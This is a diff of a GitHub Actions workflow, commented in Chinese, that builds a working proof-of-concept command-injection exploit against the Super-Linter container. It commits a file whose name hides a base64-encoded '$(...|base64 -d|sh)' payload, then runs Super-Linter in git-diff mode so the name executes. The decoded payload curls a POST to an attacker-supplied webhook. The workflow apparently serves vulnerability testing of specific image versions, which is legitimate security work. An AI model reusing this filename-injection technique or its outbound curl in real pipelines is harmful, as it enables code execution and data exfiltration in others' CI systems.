@@ -18,45 +18,63 @@ jobs:
     steps:
       - name: Checkout Code
         uses: actions/checkout@v4
-        with:
-          # 必须拉取完整历史，否则 checkout -b 可能会出问题（虽然通常不用，但为了保险）
-          fetch-depth: 0
 
-      - name: 1. Generate Malicious Filename (The Exploit)
+      - name: 1. Setup Git & Inject Malicious File
         run: |
-          # 构造 Payload
+          # --- 关键步骤：重置 Git 环境以模拟 PR ---
+          
+          # 1. 删除原本的 .git，我们要自己控制历史
+          rm -rf .git
+          git init
+          # 配置假用户，因为 commit 需要
+          git config --global user.email "security@test.com"
+          git config --global user.name "SecurityTest"
+          
+          # 2. 创建基准分支 (master)
+          echo "# Safe Code" > README.md
+          git add README.md
+          git commit -m "Initial safe commit"
+          git branch -m master
+          
+          # 3. 构造恶意文件名 (使用 Base64 技巧)
+          # 解码后命令: curl -fsS -X POST [URL] -d ...
           ATTACK_CMD="curl -fsS -X POST \"${{ inputs.webhook_url }}\" -d \"vulnerable_version=${{ inputs.target_version }}\""
           ENCODED_CMD=$(echo -n "$ATTACK_CMD" | base64 -w0)
-          
-          # Base64 编码文件名，避免路径斜杠报错
           PAYLOAD="pre\$(echo $ENCODED_CMD|base64 -d|sh).md"
           
-          echo "Payload Filename: $PAYLOAD"
+          echo "Creating malicious file: $PAYLOAD"
           touch "$PAYLOAD"
-
-      - name: 2. Fix Git Environment (Critical Step)
-        run: |
-          # 【关键修复】
-          # Super-Linter 的 InitializeDefaultBranch 函数在 RUN_LOCAL=true 时强行检查 'master' 分支。
-          # GHA checkout 默认是 Detached HEAD，所以我们手动创建一个 master 分支来欺骗它。
-          git checkout -b master
           
-      - name: 3. Run Super-Linter via Docker
+          # 4. 【核心修正】必须提交！
+          # Super-Linter 的 git diff/ls-tree 逻辑看不见未提交的文件
+          git add "$PAYLOAD"
+          git commit -m "Add malicious payload"
+          
+          # 5. 保存当前 Commit SHA 供 Docker 使用
+          echo "CURRENT_SHA=$(git rev-parse HEAD)" >> $GITHUB_ENV
+
+      - name: 2. Run Super-Linter via Docker
+        # 即使报错也继续，方便看结果
+        continue-on-error: true
         run: |
           echo "Testing against image version: ${{ inputs.target_version }}"
           
-          # 1. RUN_LOCAL=true: 必须开启，否则脚本会尝试读取 GHA Event JSON，导致更复杂的报错。
-          # 2. VALIDATE_ALL_CODEBASE=true: 告诉它不要去算 Diff，而是扫描所有文件（直接触发 find）。
-          #    虽然上面的函数没用到这个变量，但主流程里需要它来跳过 git diff 计算。
+          # 核心参数配置：
+          # RUN_LOCAL=true              : 本地模式
+          # VALIDATE_ALL_CODEBASE=false : 强制走 Git Diff 逻辑 (触发漏洞的路径)
+          # DEFAULT_BRANCH=master       : 告诉它对比目标是 master
+          # GITHUB_SHA=...              : 告诉它当前 Commit 是哪个
           
           docker run --rm \
             -e RUN_LOCAL=true \
-            -e VALIDATE_ALL_CODEBASE=true \
+            -e VALIDATE_ALL_CODEBASE=false \
+            -e DEFAULT_BRANCH=master \
+            -e GITHUB_SHA=${{ env.CURRENT_SHA }} \
             -e GITHUB_TOKEN=${{ secrets.GITHUB_TOKEN }} \
             -v "$(pwd):/tmp/lint" \
             ghcr.io/super-linter/super-linter:${{ inputs.target_version }}
             
-      - name: 4. Check Result
-        if: always()
+      - name: 3. Verify
         run: |
-          echo "Test finished. Please check ${{ inputs.webhook_url }} for the ping."
+          echo "Exploit attempt finished."
+          echo "If successful, you should see a POST request at: ${{ inputs.webhook_url }}"
